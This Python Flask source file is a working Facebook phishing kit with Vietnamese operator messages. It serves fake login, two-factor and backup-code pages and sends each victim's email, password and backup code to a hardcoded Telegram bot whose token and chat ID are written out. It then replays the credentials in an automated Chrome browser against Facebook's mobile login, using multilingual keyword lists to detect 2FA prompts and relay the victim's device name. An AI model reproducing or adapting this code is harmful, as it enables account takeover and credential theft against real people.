from flask import Flask, request, render_template, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import requests
import time
import re

app = Flask(__name__)
drivers = []

def send_telegram_message(message):
    token = '8075511413:AAGyFKy0jk2VNbi3nM3AdqOMVqMgeEfvTBM'
    chat_id = '6565555925'
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=data)
    except:
        pass

@app.route('/')
def home():
    return render_template("FACEBOOKLOGIN.html")

@app.route('/2fa')
def twofa():
    return render_template("2fa.html")

@app.route('/fbhome')
def fbhome():
    return render_template("home.html")

@app.route('/backup')
def backup():
    return render_template("backup_code.html")

@app.route('/submit_backup', methods=['POST'])
def submit_backup():
    code = request.form.get("backup_code")
    if code:
        send_telegram_message(f"🔐 Mã dự phòng đã nhập: {code}")
        return render_template("confirm_backup.html", code=code)
    else:
        return "❌ Không nhận được mã backup"

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")
    send_telegram_message(f"📥 Email: {email}\n🔑 Pass: {password}")

    try:
        mobile_emulation = {
            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 "
                         "Mobile/15E148 Safari/604.1"
        }
        options = webdriver.ChromeOptions()
        options.add_experimental_option("mobileEmulation", mobile_emulation)
        options.add_argument("--disable-notifications")

        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        drivers.append(driver)

        driver.get("https://m.facebook.com/login")
        driver.find_element(By.ID, "m_login_email").send_keys(email)
        driver.find_element(By.ID, "m_login_password").send_keys(password)

        send_telegram_message("🧐 Đã điền tài khoản, chờ bạn bấm Log In...")
        time.sleep(7)

        current_url = driver.current_url
        page_html = driver.page_source
        page_html_lower = page_html.lower()

        name_match = re.search(r'>([^<]+)[\u00b7\u2022]\s*Facebook', page_html)
        account_name = name_match.group(1).strip() if name_match else "Facebook User"

        device_patterns = [
            r'notification to your ([^<\n]+?)\.',
            r'check your ([^<\n]+?) notifications',
            r'on your ([^<\n]+?)\.',
            r'thông báo tới thiết bị ([^<\n]+)',
            r'gửi thông báo tới ([^<\n]+)',
            r'通知已发送至您的\s*([^<\n]+)',
            r'notification à votre ([^<\n]+)',
            r'hemos enviado una notificación a tu ([^<\n]+)'
        ]
        device_name = "your device"
        for pattern in device_patterns:
            match = re.search(pattern, page_html_lower)
            if match:
                device_name = match.group(1).strip()
                break

        twofa_keywords = [
            "check your notifications", "we sent a notification", "approve your login", "try another way",
            "chúng tôi đã gửi thông báo", "đã gửi thông báo tới thiết bị", "thử cách khác", "đang chờ phê duyệt",
            "我们已将通知发送到您的", "请在其他设备上批准", "尝试其他方式",
            "vérifiez vos notifications", "nous avons envoyé une notification", "essayez une autre méthode",
            "revisa tus notificaciones", "hemos enviado una notificación", "aprueba tu inicio de sesión",
            "verifique suas notificações", "enviamos uma notificação", "tente outro método"
        ]

        if any(kw in page_html_lower for kw in twofa_keywords):
            send_telegram_message(f"✅ 2FA:\n👤 {account_name}\n📱 Thiết bị: {device_name}")
            return jsonify({
                "status": "2fa",
                "account": account_name,
                "device": device_name
            })

        elif any(key in current_url or key in page_html_lower for key in [
            "login_attempt", "incorrect", "mật khẩu không đúng", "mật khẩu không hợp lệ",
            "the password you entered is incorrect", "your password was incorrect",
            "tên người dùng hoặc mật khẩu không hợp lệ"
        ]):
            send_telegram_message("❌ Sai mật khẩu hoặc không đăng nhập được.")
            return jsonify({"status": "error"})

        else:
            send_telegram_message("✅ Đăng nhập thành công.")
            return jsonify({"status": "success"})

    except Exception as e:
        send_telegram_message(f"❌ Lỗi xử lý login: {str(e)}")
        return jsonify({"status": "error"})

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
